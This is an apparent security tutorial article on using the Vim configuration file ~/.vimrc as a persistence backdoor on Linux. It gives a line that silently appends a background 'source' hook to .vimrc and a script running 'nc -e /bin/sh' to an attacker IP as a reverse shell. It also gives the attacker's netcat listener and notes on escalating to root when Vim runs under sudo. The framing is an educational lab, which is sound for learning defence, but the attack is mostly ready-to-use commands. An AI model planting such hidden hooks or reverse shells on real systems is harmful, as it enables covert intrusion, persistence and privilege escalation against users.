# Backdoor Via Vim
* * *

The VIM editor needs no introduction; it is a widely used command-line text editor on Linux and comes pre-installed on most Unix and Linux systems. In many Linux setups, individualized VIM configuration settings reside in the user's home directory within the .vimrc file. This file hosts VIM-specific scripting commands, facilitating users to personalize Vim's functionalities according to their preferences. It is automatically loaded when Vim starts, enabling users to tailor their editing environment to their liking.

This intriguing setup presents an opportunity. By manipulating the .vimrc file, one can orchestrate unintended actions during a user's VIM session, especially if VIM operates within an unrestricted environment.

To grasp the potential, let's experiment within the VIM environment. Execute the following command within VIM to get the user ID (or username):
```sh
:!echo $UID
# OR
:!echo $USER
```

![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/vimHacks/BackdoorViaVim/images/UID.png)

![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/vimHacks/BackdoorViaVim/images/1000.png)

Moreover, we can inject desired commands into the .vimrc file, ensuring their execution in the background whenever the current user initiates Vim. One particularly intriguing command is the source command, enabling the loading and execution of a shell script.

Let's illustrate this with an example scenario: suppose an attacker, operating from a Kali Linux machine, gains access to a victim machine running Ubuntu. The attacker aims to establish a backdoor on the victim machine, such as creating a reverse shell connection to the attacker's machine.

Initially, on the victim machine, the attacker crafts or alters the .vimrc file by appending the following line:
```sh
echo ':silent !source /home/msbit/Labs/vimHacking/ncReverseSh.sh &' >> ~/.vimrc
```
Breaking down this command: firstly,
suppresses any debug output that would typically be displayed to the user when Vim runs. Then, the source command, preceded by an exclamation mark, loads and executes the script ncReverseSh.sh, followed by the & to execute the command in the background.

Subsequently, the attacker populates the script ncReverseSh.sh with the payload:
```sh
#!/bin/bash
nc -e /bin/sh 192.168.171.1 7777 &
```

This script invokes the nc command with the -e switch, specifying the program (/bin/sh) to execute upon connection establishment, and the attacker's IP and listening port. Again, the & ensures the command runs in the background.

Now let's give it a shot, executing the listener on the attacker machine on port 7777:
```sh
nc -lnvp 7777
```

On the victim machine, launching Vim to read any file triggers the execution of the backdoor script. Remarkably, the attacker machine promptly establishes a connection with the victim, without arousing suspicion. The file intended for reading opens seamlessly, with no discernible signs of tampering.
![alt text](https://github.com/masjadaan/TechSecurityArticles/blob/main/Linux/vimHacks/BackdoorViaVim/images/reverseShell.png)

However, it's crucial to understand that the reverse shell obtained doesn't necessarily grant extensive access beyond that of the current user.

We can further weaponize this VIM vector to escalate privileges to root if VIM is executed with root privileges. However, this aspect is contingent upon the Linux distribution. For instance, in systems like Ubuntu and Red Hat, VIM utilizes the current user's .vimrc configuration file even within a sudo context. Consequently, if the user invokes VIM via sudo, our sourced script will execute as root. Conversely, in distributions like Debian, VIM defaults to the root user's configuration when invoked with sudo, disregarding the current user's settings.

Additionally, another tactic involves checking the sudo permissions granted to the current user. Sometimes, a regular user may be authorized to run only specific applications with sudo privileges:
```sh
sudo -l

(root) NOPASSWD: /usr/bin/vim /opt/whatever.conf
```

This configuration allows the root user to execute /usr/bin/vim on /opt/whatever.conf without requiring a password.

In conclusion, we have seen how an attacker can exploit a legitimate program to achieve malicious goals.

Happy Learning...


### Test Environment

- Victim
  - Ubuntu (16.04.7 LTS (Xenial Xerus), x86_64 GNU/Linux)
  - netcat-traditional/xenial,now 1.10-41 amd64
  - VIM - Vi IMproved 7.4
 
- Attacker
  - Kali GNU/Linux Rolling 6.6.15-2
